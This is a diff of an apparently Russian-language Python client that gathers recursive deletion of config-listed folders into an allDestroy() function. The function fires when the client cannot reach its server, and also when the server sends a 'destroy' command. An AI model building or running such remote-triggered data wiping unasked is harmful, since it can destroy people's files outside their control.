@@ -159,6 +159,26 @@ def isFile(root_list):
     except:
         pass
 
+# Удаление всех файлов по путям из ini файла
+def allDestroy():
+    global config
+    global root_list
+    global delete_files
+
+    for rol in config['DELETE_PATH'].values():
+        if (rol == 'first'):
+            continue
+        root_list.append(rol)
+
+    isFile(root_list)               # Удаления файлов в корневом каталоге и во всех подпапках
+    if (delete_files):
+        for rl in root_list:        # Удаление корневого каталога 
+            try:
+                shutil.rmtree(rl)
+            except:
+                pass
+    print('Удалил файлы\nBye ^-^')
+
 ######## DEBUG ########
 if (debug):
     debugFolders(1000, 'test')
@@ -186,19 +206,7 @@ while i <= recon:
 
 if (running == False):
     print('Подключение к серверу отсутствует')
-    for rol in config['DELETE_PATH'].values():
-        if (rol == 'first'):
-            continue
-        root_list.append(rol)
-
-    isFile(root_list)               # Удаления файлов в корневом каталоге и во всех подпапках
-    if (delete_files):
-        for rl in root_list:        # Удаление корневого каталога 
-            try:
-                shutil.rmtree(rl)
-            except:
-                pass
-    print('Удалил файлы\nBye ^-^')
+    allDestroy()
     sleep(5)
 
 while running:
@@ -225,7 +233,7 @@ while running:
 
                 # Если команда дестрой
                 if data[1] == 'destroy':
-                    secure_delete('./test/') # Доработать!
+                    allDestroy()
                     message = 'mes:destroy;'
                     server.send(message.encode())
                     server.close()
